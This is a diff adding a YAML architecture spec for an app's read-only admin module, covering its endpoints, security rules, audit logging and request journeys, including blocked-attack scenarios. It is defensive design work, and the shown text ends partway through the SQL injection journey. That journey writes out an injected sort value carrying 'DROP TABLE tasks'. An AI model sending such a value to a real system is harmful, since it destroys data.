@@ -1,0 +1,1704 @@
+spec_sections: [1, 2, 3]
+
+nodes:
+  # =============================================
+  # PROCESSES — base
+  # =============================================
+  AdminAuthorizationGuard:
+    type: process
+    description: Verifies the authenticated user holds the admin role before granting access to any admin endpoint
+
+  DashboardAggregator:
+    type: process
+    description: Queries users and tasks tables to compile summary statistics for the admin dashboard
+
+  CrossUserTaskLoader:
+    type: process
+    description: Loads tasks belonging to any user regardless of ownership, bypassing the per-user task ownership constraint
+
+  AdminAuditLogger:
+    type: process
+    description: Records every admin action (dashboard view, user list, task inspection) as an auditable event
+
+  # =============================================
+  # PROCESSES — failures lens
+  # =============================================
+  AdminQueryTimeoutEnforcer:
+    type: process
+    description: Monitors query execution time and aborts admin queries that exceed the per-endpoint timeout threshold defined in AdminQueryTimeoutConfig
+
+  AdminAuditFailoverWriter:
+    type: process
+    description: Fallback audit writer activated when the primary AdminAuditLogger fails — writes to a secondary store to maintain audit continuity
+
+  AdminInputValidator:
+    type: process
+    description: Validates admin request parameters — pagination bounds, date formats, UUID formats — before passing to business logic
+
+  AdminCacheInvalidator:
+    type: process
+    description: Detects when cached dashboard data exceeds its TTL and marks it as stale via StaleDashboardIndicator, triggering a background refresh
+
+  # =============================================
+  # PROCESSES — threats lens
+  # =============================================
+  AdminSessionIntegrityChecker:
+    type: process
+    description: Validates that the admin session source IP and user-agent fingerprint match the values recorded at session creation in AdminSessionBinding — rejects on mismatch
+
+  AdminQueryParamSanitizer:
+    type: process
+    description: Sanitizes admin-specific query parameters (sort, filter, search, date range) against SQL injection, command injection, and LDAP injection patterns before they reach the database layer
+
+  AdminResponseRedactor:
+    type: process
+    description: Escapes HTML and script content in admin API response payloads and masks sensitive PII fields (emails partially masked, password hashes excluded) to prevent stored XSS execution and limit data exposure
+
+  AdminAnomalyDetector:
+    type: process
+    description: Monitors rolling AdminAccessPattern for anomalous admin behavior — unusual access hours, geographic shifts, abnormal data volume per session, rapid sequential endpoint cycling — and emits AdminAnomalyAlert when thresholds are breached
+
+  AdminCsrfValidator:
+    type: process
+    description: Validates that every admin request includes a valid anti-CSRF token matching the token issued for the current admin session — rejects requests with missing or mismatched tokens
+
+  AdminReplayGuard:
+    type: process
+    description: Detects and rejects replayed admin requests by validating request nonce uniqueness and timestamp freshness against a sliding window of previously seen nonces
+
+  CrossUserTaskReader:
+    type: process
+    description: Reads a single task by ID regardless of ownership, bypassing the per-user TaskOwnershipVerifier — used by admin to inspect any task
+
+  AdminAuditLogQueryRunner:
+    type: process
+    description: Queries and retrieves audit log entries based on filters (admin ID, action type, target resource), date range, and pagination parameters
+
+  # =============================================
+  # PROCESSES — edge cases lens
+  # =============================================
+  AdminRoleRevocationEnforcer:
+    type: process
+    description: Performs just-in-time admin role re-verification from the authoritative session store immediately before data access — catches role removal that occurred after the initial TokenValidator check earlier in the pipeline
+
+  AdminCsrfTokenRotator:
+    type: process
+    description: Rotates the CSRF token on each admin request and manages a short grace window (AdminCsrfGraceWindow) where both old and new tokens are accepted to prevent false rejections of in-flight requests during rotation
+
+  AdminCacheStampedeGuard:
+    type: process
+    description: Acquires a distributed lock (AdminCacheLock) before rebuilding dashboard cache — if lock is already held by another rebuild, forces the current request to wait or serve stale data instead of launching a duplicate rebuild
+
+  AdminSelfAccessDetector:
+    type: process
+    description: Compares the requesting admin's user ID against the target resource's user ID — detects when an admin is viewing their own profile or data via admin endpoints and flags the access for enhanced audit scrutiny
+
+  AdminSessionRevocationChecker:
+    type: process
+    description: Performs real-time session validity check against the session store immediately before data access — catches sessions revoked by security team action, concurrent session eviction, or automated policy enforcement that occurred after initial auth passed
+
+  AdminIdempotencyKeyValidator:
+    type: process
+    description: Extracts and validates per-request idempotency keys — checks the deduplication store for previously seen keys and returns cached responses for duplicates, preventing double-processing and duplicate audit entries for retried requests
+
+  AdminConcurrentSessionManager:
+    type: process
+    description: Tracks active admin session count per admin user via AdminConcurrentSessionRegistry — enforces concurrent session limits by evicting the oldest session or rejecting new session creation when the limit is exceeded
+
+  # =============================================
+  # ARTIFACTS — base
+  # =============================================
+  DashboardSummary:
+    type: artifact
+    description: Aggregated overview containing total user count, total task count, completion rate, and recent activity
+
+  CrossUserTaskList:
+    type: artifact
+    description: List of tasks belonging to a specific user as retrieved by an admin, including task status and metadata
+
+  AdminAuditEntry:
+    type: artifact
+    description: Structured log entry recording which admin performed what action on which resource and when
+
+  # =============================================
+  # ARTIFACTS — failures lens
+  # =============================================
+  AdminErrorResponse:
+    type: artifact
+    description: Structured admin error payload containing error code, user-safe message, field-level validation details, and request correlation ID
+
+  AuditWriteFailureEvent:
+    type: artifact
+    description: Event emitted when the primary audit logging system fails — contains failure reason, original audit entry, and failover status
+
+  AdminQueryTimeoutConfig:
+    type: artifact
+    description: Per-endpoint timeout thresholds for admin queries — dashboard aggregation 5s, user list 3s, task list 10s, audit log 5s
+
+  StaleDashboardIndicator:
+    type: artifact
+    description: Marker attached to cached dashboard data indicating it is stale — includes cache age, original fetch timestamp, and staleness reason
+
+  # =============================================
+  # ARTIFACTS — threats lens
+  # =============================================
+  AdminSessionBinding:
+    type: artifact
+    description: Record linking an admin session ID to the originating IP address and user-agent fingerprint, created at session start and checked on every subsequent admin request
+
+  AdminAnomalyAlert:
+    type: artifact
+    description: Structured alert emitted when anomalous admin behavior is detected — contains anomaly type, admin ID, deviation metrics, access pattern snapshot, and recommended action
+
+  AdminAccessPattern:
+    type: artifact
+    description: Rolling window of admin access metadata — timestamps, endpoints hit, data volumes returned, source IPs, geolocation — used as baseline for anomaly detection
+
+  AdminCsrfToken:
+    type: artifact
+    description: Anti-CSRF token issued per admin session, embedded in response headers and required on all subsequent admin requests for validation
+
+  AdminRequestNonce:
+    type: artifact
+    description: One-time nonce attached to each admin request — stored in a short-lived set and rejected if the same nonce is seen twice within the replay detection window
+
+  # =============================================
+  # ARTIFACTS — edge cases lens
+  # =============================================
+  AdminCacheLock:
+    type: artifact
+    description: Distributed mutex acquired during dashboard cache rebuild — contains lock holder session ID, acquisition timestamp, and TTL; prevents multiple simultaneous rebuilds (thundering herd)
+
+  AdminCsrfGraceWindow:
+    type: artifact
+    description: Short-lived record (30-second TTL) that preserves the previous CSRF token alongside the current one during rotation — allows both tokens to pass validation for in-flight requests
+
+  AdminIdempotencyKey:
+    type: artifact
+    description: Unique key attached to an admin request — stored in a deduplication store with the response hash and expiry; enables safe retries without duplicate processing within the deduplication window
+
+  AdminSessionRevocationEvent:
+    type: artifact
+    description: Event emitted when an admin session is invalidated by an external actor — contains session ID, revocation reason (security_team_action, concurrent_eviction, policy_enforcement), revoker identity, and timestamp
+
+  AdminConcurrentSessionRegistry:
+    type: artifact
+    description: Registry tracking all active sessions per admin user — includes session IDs, creation timestamps, source IPs, user-agents, and last-activity markers; consulted by AdminConcurrentSessionManager on every new session
+
+  # =============================================
+  # INTERFACES — base
+  # =============================================
+  AdminDashboardEndpoint:
+    type: interface
+    description: GET /admin/dashboard — returns aggregated platform statistics for admin users
+
+  AdminUserTasksEndpoint:
+    type: interface
+    description: GET /admin/users/:id/tasks — returns all tasks for a specified user, accessible only to admins
+
+  # =============================================
+  # INTERFACES — threats lens
+  # =============================================
+  AdminUserDetailEndpoint:
+    type: interface
+    description: GET /admin/users/:id — returns full profile details for a specific user, accessible only to admins
+
+  AdminAllTasksEndpoint:
+    type: interface
+    description: GET /admin/tasks — returns paginated list of all tasks across all users, accessible only to admins
+
+  AdminAuditLogEndpoint:
+    type: interface
+    description: GET /admin/audit-log — returns paginated and filterable audit trail entries, accessible only to admins
+
+  AdminTaskDetailEndpoint:
+    type: interface
+    description: GET /admin/tasks/:id — returns full details for a specific task regardless of owner, accessible only to admins
+
+  # =============================================
+  # RULES — base
+  # =============================================
+  AdminRoleRequiredRule:
+    type: rule
+    description: All admin endpoints require the requesting user to have the admin role; non-admins receive 403 Forbidden
+
+  AdminAuditRequiredRule:
+    type: rule
+    description: Every admin endpoint access must produce an audit log entry before the response is sent
+
+  AdminReadOnlyRule:
+    type: rule
+    description: Admin module endpoints are strictly read-only; no create, update, or delete operations on users or tasks are exposed
+
+  # =============================================
+  # RULES — failures lens
+  # =============================================
+  PaginationBoundsRule:
+    type: rule
+    description: Validates pagination parameters — page must be >= 1, limit must be between 1 and 100 inclusive; rejects requests outside these bounds with 400
+
+  FilterDateRangeRule:
+    type: rule
+    description: Validates date filter parameters — start must be <= end, both must be valid ISO-8601, maximum window of 1 year; rejects invalid ranges with 400
+
+  AuditFailClosedRule:
+    type: rule
+    description: If audit logging cannot be completed (both primary and failover fail), the admin request is rejected with 503 rather than proceeding unaudited
+
+  AdminTargetExistsRule:
+    type: rule
+    description: Admin endpoints that reference a specific user or task by ID must return 404 if the target does not exist, rather than an empty result
+
+  AdminRateLimitRule:
+    type: rule
+    description: Applies stricter per-session rate limits to admin endpoints — lower threshold than standard API rate limits, with shorter sliding window
+
+  # =============================================
+  # RULES — threats lens
+  # =============================================
+  AdminSessionBindingRule:
+    type: rule
+    description: Admin sessions are bound to the originating IP address and user-agent; any change in either value invalidates the session immediately and requires re-authentication
+
+  AdminCsrfTokenRequiredRule:
+    type: rule
+    description: All admin requests must include a valid anti-CSRF token in the request header matching the token issued for the current admin session
+
+  AdminMaxResultsRule:
+    type: rule
+    description: Admin list endpoints enforce a maximum results cap of 100 items per request — requests cannot override this limit to prevent bulk data extraction in single requests
+
+  AdminGeoRestrictionRule:
+    type: rule
+    description: Admin access is restricted to expected geographic regions based on IP geolocation — requests from unexpected geolocations are blocked and trigger a security alert
+
+  AdminTimeBoundAccessRule:
+    type: rule
+    description: Admin access outside configured business hours triggers enhanced logging, anomaly alerts, and mandatory step-up authentication before proceeding
+
+  AdminAuditImmutabilityRule:
+    type: rule
+    description: Audit log entries are append-only and immutable — no API endpoint or admin action can modify or delete existing audit records
+
+  # =============================================
+  # RULES — edge cases lens
+  # =============================================
+  AdminCsrfGracePeriodRule:
+    type: rule
+    description: During CSRF token rotation, both the previous and current tokens are valid for a 30-second grace window — requests arriving with the old token within this window are accepted; requests after the window expires are rejected
+
+  AdminCacheRebuildMutexRule:
+    type: rule
+    description: Only one dashboard cache rebuild may execute at a time — concurrent cache-miss requests must wait for the in-progress rebuild to complete or serve stale data; prevents thundering herd on cache expiry
+
+  AdminSelfAccessRedactionRule:
+    type: rule
+    description: Admin viewing their own profile via admin endpoints receives the same redacted view as any other admin — no self-privilege bypass; emails are partially masked and password hashes excluded regardless of self-access
+
+  AdminConcurrentSessionLimitRule:
+    type: rule
+    description: Each admin user may have at most 3 concurrent active sessions — exceeding the limit triggers eviction of the oldest session or rejection of the new session, depending on policy configuration
+
+  AdminStaleReadToleranceRule:
+    type: rule
+    description: Admin reads of user and task data include a freshness timestamp in the response — data older than 5 seconds from query execution carries a stale-data indicator header so clients can detect and handle staleness
+
+  AdminSecurityRulePrecedenceRule:
+    type: rule
+    description: When multiple security rules reject the same request simultaneously, the highest-severity rejection takes precedence for the error response — order is session revocation > session binding > geo restriction > CSRF > time-bound > rate limit; all violations are logged regardless of which surfaces
+
+journeys:
+  # =============================================
+  # HAPPY-PATH JOURNEYS — base
+  # =============================================
+  AdminViewsDashboard:
+    steps:
+      - node: _actors/Admin
+        action: Requests the admin dashboard
+      - node: gateway/RequestRouter
+        action: Routes request to AdminDashboardEndpoint
+      - node: AdminDashboardEndpoint
+        action: Receives GET /admin/dashboard request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminAnomalyDetector
+        action: Records access in AdminAccessPattern and checks for anomalous behavior
+      - node: DashboardAggregator
+        action: Queries user and task data to compile summary statistics
+      - node: users/UserLister
+        action: Returns total user count and user status breakdown
+      - node: tasks/TaskLister
+        action: Returns total task count and completion statistics
+      - node: DashboardSummary
+        action: Assembled with user count, task count, completion rate, and recent activity
+      - node: AdminAuditLogger
+        action: Records dashboard access by this admin
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type dashboard_view, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats DashboardSummary as JSON API response
+      - node: _actors/Admin
+        action: Receives the dashboard overview with platform statistics
+
+  AdminViewsUserTasks:
+    steps:
+      - node: _actors/Admin
+        action: Requests task list for a specific user by user ID
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserTasksEndpoint
+      - node: AdminUserTasksEndpoint
+        action: Receives GET /admin/users/:id/tasks request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates the user ID parameter is a well-formed UUID
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes the user ID parameter against injection patterns
+      - node: users/UserReader
+        action: Verifies the target user ID exists and loads user record
+      - node: AdminTargetExistsRule
+        action: Confirms target user exists; would return 404 if not
+      - node: CrossUserTaskLoader
+        action: Loads all tasks belonging to the target user, bypassing ownership restriction
+      - node: CrossUserTaskList
+        action: Populated with the target user's tasks including status and metadata
+      - node: AdminResponseRedactor
+        action: Escapes any HTML/script content in task title and description fields
+      - node: AdminAuditLogger
+        action: Records that this admin viewed tasks for the target user
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type view_user_tasks, target user ID, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats CrossUserTaskList as JSON API response
+      - node: _actors/Admin
+        action: Receives the list of the target user's tasks
+
+  AdminViewsAllUsers:
+    steps:
+      - node: _actors/Admin
+        action: Requests the list of all users in the system
+      - node: gateway/RequestRouter
+        action: Routes request to users/ListUsersEndpoint
+      - node: users/ListUsersEndpoint
+        action: Receives GET /admin/users request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates pagination parameters against PaginationBoundsRule
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes sort and filter query parameters against injection patterns
+      - node: users/UserLister
+        action: Retrieves paginated user records from storage
+      - node: users/UserList
+        action: Populated with user records including roles and account status
+      - node: AdminMaxResultsRule
+        action: Enforces maximum 100 results per page
+      - node: AdminResponseRedactor
+        action: Masks sensitive PII fields — emails partially masked, password hashes excluded
+      - node: AdminAuditLogger
+        action: Records that this admin listed all users
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type list_all_users, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats user list as JSON API response
+      - node: _actors/Admin
+        action: Receives the paginated list of users
+
+  # =============================================
+  # HAPPY-PATH JOURNEYS — threats lens (new attack surfaces)
+  # =============================================
+  AdminViewsUserDetail:
+    steps:
+      - node: _actors/Admin
+        action: Requests full profile details for a specific user by ID
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserDetailEndpoint
+      - node: AdminUserDetailEndpoint
+        action: Receives GET /admin/users/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates the user ID parameter is a well-formed UUID
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes the user ID parameter against injection patterns
+      - node: users/UserReader
+        action: Loads the full user record by ID
+      - node: AdminTargetExistsRule
+        action: Confirms target user exists; would return 404 if not
+      - node: AdminResponseRedactor
+        action: Masks sensitive fields — email partially masked, password hash excluded, internal flags hidden
+      - node: AdminAuditLogger
+        action: Records that this admin viewed user detail for the target user
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type view_user_detail, target user ID, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats user detail as JSON API response
+      - node: _actors/Admin
+        action: Receives the user profile with sensitive fields redacted
+
+  AdminViewsAllTasks:
+    steps:
+      - node: _actors/Admin
+        action: Requests the paginated list of all tasks across all users
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives GET /admin/tasks request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates pagination and filter parameters against PaginationBoundsRule
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes sort, filter, and search query parameters against injection patterns
+      - node: tasks/TaskLister
+        action: Retrieves paginated task records across all users
+      - node: AdminMaxResultsRule
+        action: Enforces maximum 100 results per page
+      - node: AdminResponseRedactor
+        action: Escapes any HTML/script content in task title and description fields
+      - node: AdminAuditLogger
+        action: Records that this admin listed all tasks
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type list_all_tasks, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats task list as JSON API response
+      - node: _actors/Admin
+        action: Receives the paginated list of all tasks
+
+  AdminViewsTaskDetail:
+    steps:
+      - node: _actors/Admin
+        action: Requests full details for a specific task by ID
+      - node: gateway/RequestRouter
+        action: Routes request to AdminTaskDetailEndpoint
+      - node: AdminTaskDetailEndpoint
+        action: Receives GET /admin/tasks/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates the task ID parameter is a well-formed UUID
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes the task ID parameter against injection patterns
+      - node: CrossUserTaskReader
+        action: Loads the full task record by ID, bypassing ownership restriction
+      - node: AdminTargetExistsRule
+        action: Confirms target task exists; would return 404 if not
+      - node: AdminResponseRedactor
+        action: Escapes any HTML/script content in task title and description fields
+      - node: AdminAuditLogger
+        action: Records that this admin viewed task detail
+      - node: AdminAuditEntry
+        action: Created with admin ID, action type view_task_detail, target task ID, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats task detail as JSON API response
+      - node: _actors/Admin
+        action: Receives the full task details
+
+  AdminViewsAuditLog:
+    steps:
+      - node: _actors/Admin
+        action: Requests the audit log with date range and optional filter parameters
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAuditLogEndpoint
+      - node: AdminAuditLogEndpoint
+        action: Receives GET /admin/audit-log request
+      - node: auth/TokenValidator
+        action: Validates the session token from the request
+      - node: auth/UserContextLoader
+        action: Loads the authenticated user context with role information
+      - node: AdminSessionIntegrityChecker
+        action: Validates session IP and user-agent match AdminSessionBinding
+      - node: AdminCsrfValidator
+        action: Validates anti-CSRF token in request header matches session token
+      - node: AdminAuthorizationGuard
+        action: Checks that the user context contains the admin role
+      - node: AdminRoleRequiredRule
+        action: Confirms admin role is present; allows request to proceed
+      - node: AdminInputValidator
+        action: Validates pagination, date range, and filter parameters
+      - node: FilterDateRangeRule
+        action: Validates start <= end, both valid ISO-8601, within 1-year maximum window
+      - node: AdminQueryParamSanitizer
+        action: Sanitizes filter and search parameters against injection patterns
+      - node: AdminAuditLogQueryRunner
+        action: Queries audit log entries matching the filter criteria with pagination
+      - node: AdminAuditEntry
+        action: Matching entries retrieved with pagination metadata
+      - node: AdminMaxResultsRule
+        action: Enforces maximum 100 entries per page
+      - node: AdminAuditLogger
+        action: Records that this admin viewed the audit log (meta-audit entry)
+      - node: AdminAuditEntry
+        action: Meta-audit created with admin ID, action type view_audit_log, filter params, and timestamp
+      - node: AdminAuditRequiredRule
+        action: Ensures meta-audit entry is persisted before response is sent
+      - node: gateway/ResponseFormatter
+        action: Formats audit log entries as JSON API response
+      - node: _actors/Admin
+        action: Receives the filtered and paginated audit log entries
+
+  # =============================================
+  # THREAT JOURNEYS — base
+  # =============================================
+  NonAdminAccessDenied:
+    steps:
+      - node: _actors/User
+        action: Attempts to access an admin endpoint
+      - node: gateway/RequestRouter
+        action: Routes request to an admin endpoint
+      - node: AdminDashboardEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is valid
+      - node: auth/UserContextLoader
+        action: Loads user context revealing a regular non-admin role
+      - node: AdminAuthorizationGuard
+        action: Checks user role and finds it is not admin
+      - node: AdminRoleRequiredRule
+        action: Rejects the request — user lacks admin role
+      - node: AdminAuditLogger
+        action: Records the denied access attempt with user ID and target endpoint
+      - node: AdminAuditEntry
+        action: Created with user ID, action type access_denied, target endpoint, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as a security event for monitoring
+      - node: gateway/ErrorPayload
+        action: Assembled with 403 Forbidden status and admin role required message
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/User
+        action: Receives 403 Forbidden response
+
+  PrivilegeEscalationToAdminBlocked:
+    steps:
+      - node: _actors/PrivilegeEscalator
+        action: Crafts a request with manipulated role claims to impersonate admin
+      - node: gateway/RequestRouter
+        action: Routes the request to an admin endpoint
+      - node: AdminDashboardEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is authentic but role claim was tampered
+      - node: auth/UserContextLoader
+        action: Loads the user context from the server-side session store, ignoring client-side role claims
+      - node: AdminAuthorizationGuard
+        action: Checks the server-authoritative role and finds user is not admin
+      - node: AdminRoleRequiredRule
+        action: Rejects the request — server-side role does not match admin
+      - node: AdminAuditLogger
+        action: Records the escalation attempt with the mismatched role details
+      - node: AdminAuditEntry
+        action: Created with attacker session ID, action type privilege_escalation_attempt, and details
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as a high-severity security event
+      - node: gateway/ErrorPayload
+        action: Assembled with 403 Forbidden status and generic message, no role detail leaked
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/PrivilegeEscalator
+        action: Receives 403 Forbidden with no information about why escalation failed
+
+  CompromisedAdminActivityAudited:
+    steps:
+      - node: _actors/CompromisedAdmin
+        action: Accesses admin endpoints using a legitimate but compromised admin account
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserTasksEndpoint
+      - node: AdminUserTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is legitimate
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is genuinely admin
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — IP and user-agent match (attacker is using same network)
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — access is granted
+      - node: AdminRoleRequiredRule
+        action: Role check passes
+      - node: AdminAnomalyDetector
+        action: Records access in AdminAccessPattern — flags unusual data volume or access pattern for review
+      - node: CrossUserTaskLoader
+        action: Loads the requested user's tasks
+      - node: CrossUserTaskList
+        action: Populated with target user's tasks
+      - node: AdminResponseRedactor
+        action: Masks sensitive PII fields before response — limits exposure even with valid access
+      - node: AdminAuditLogger
+        action: Records the access with full details — admin ID, target user, timestamp, source IP
+      - node: AdminAuditEntry
+        action: Created with comprehensive audit trail enabling post-incident forensics
+      - node: AdminAuditRequiredRule
+        action: Ensures the audit entry is persisted before response is sent
+      - node: gateway/SecurityAuditEvent
+        action: Emitted for all admin actions, enabling anomaly detection on access patterns
+      - node: gateway/ResponseFormatter
+        action: Formats the task list response
+      - node: _actors/CompromisedAdmin
+        action: Receives the data — but every access is logged for forensic review
+
+  AdminEndpointWriteAttemptBlocked:
+    steps:
+      - node: _actors/AuthenticatedMaliciousUser
+        action: Sends a POST/PUT/DELETE request to an admin endpoint attempting to modify data
+      - node: gateway/RequestRouter
+        action: Routes the request to the admin module
+      - node: AdminDashboardEndpoint
+        action: Receives the non-GET request
+      - node: AdminReadOnlyRule
+        action: Rejects the request — admin endpoints only accept GET requests
+      - node: AdminAuditLogger
+        action: Records the rejected write attempt
+      - node: AdminAuditEntry
+        action: Created with user ID, HTTP method, target endpoint, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as a security event — unexpected HTTP method on read-only endpoint
+      - node: gateway/ErrorPayload
+        action: Assembled with 405 Method Not Allowed status
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/AuthenticatedMaliciousUser
+        action: Receives 405 Method Not Allowed
+
+  UnauthenticatedAdminAccessBlocked:
+    steps:
+      - node: _actors/UnauthenticatedAttacker
+        action: Sends a request to an admin endpoint without any session token
+      - node: gateway/RequestRouter
+        action: Routes the request to an admin endpoint
+      - node: AdminDashboardEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Finds no session token in the request — authentication fails
+      - node: AdminAuditLogger
+        action: Records the unauthenticated access attempt with source IP
+      - node: AdminAuditEntry
+        action: Created with action type unauthenticated_admin_access, source IP, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as a security event for unauthenticated admin access attempt
+      - node: gateway/ErrorPayload
+        action: Assembled with 401 Unauthorized status
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/UnauthenticatedAttacker
+        action: Receives 401 Unauthorized — never reaches admin authorization check
+
+  # =============================================
+  # THREAT JOURNEYS — threats lens
+  # =============================================
+  AdminSessionHijackDetected:
+    steps:
+      - node: _actors/SessionHijacker
+        action: Steals an admin session token via network sniffing, XSS on another domain, or log file exposure
+      - node: _actors/SessionHijacker
+        action: Sends request to AdminDashboardEndpoint using the stolen admin token from a different IP address
+      - node: gateway/RequestRouter
+        action: Routes request to AdminDashboardEndpoint
+      - node: AdminDashboardEndpoint
+        action: Receives the request with valid-looking admin token
+      - node: auth/TokenValidator
+        action: Validates the session token — token itself is cryptographically valid
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is genuinely admin
+      - node: AdminSessionIntegrityChecker
+        action: Extracts source IP and user-agent from the incoming request
+      - node: AdminSessionBinding
+        action: Looks up the original IP and user-agent recorded at session creation
+      - node: AdminSessionIntegrityChecker
+        action: Compares current IP against bound IP — mismatch detected (different network)
+      - node: AdminSessionBindingRule
+        action: Enforces binding — IP mismatch triggers immediate session invalidation
+      - node: AdminSessionIntegrityChecker
+        action: Invalidates the admin session in the session store — token is now void
+      - node: AdminAuditLogger
+        action: Records session hijack detection with original IP, attacking IP, token ID, and timestamp
+      - node: AdminAuditEntry
+        action: Created with action type session_hijack_detected, both IPs, session ID, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as critical security event — session hijack attempt on admin account
+      - node: gateway/ErrorPayload
+        action: Assembled with 401 Unauthorized — generic message, no session binding details leaked
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/SessionHijacker
+        action: Receives 401 Unauthorized — stolen token is now permanently invalidated
+
+  AdminSqlInjectionInFilterBlocked:
+    steps:
+      - node: _actors/SQLInjector
+        action: "Authenticates as admin and sends GET /admin/tasks?sort=title;DROP TABLE tasks-- with SQL injection in sort parameter"
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is valid
+      - node: auth/UserContextLoader
+        action: Loads user context — user has admin role
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — IP and user-agent match
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — authorization passes
+      - node: AdminRoleRequiredRule
+        action: Role check passes
+      - node: AdminInputValidator
+        action: Validates pagination parameters — passes structural validation
+      - node: AdminQueryParamSanitizer
+        action: Scans sort parameter against SQL injection patterns — detects semicolon, DROP keyword, and comment sequence
+      - node: AdminQueryParamSanitizer
+        action: Rejects request immediately — does not pass injected parameter to database layer
+      - node: AdminAuditLogger
+        action: Records SQL injection attempt with admin ID, parameter name, injected value, and matched pattern
+      - node: AdminAuditEntry
+        action: Created with action type sql_injection_attempt, parameter details, and timestamp
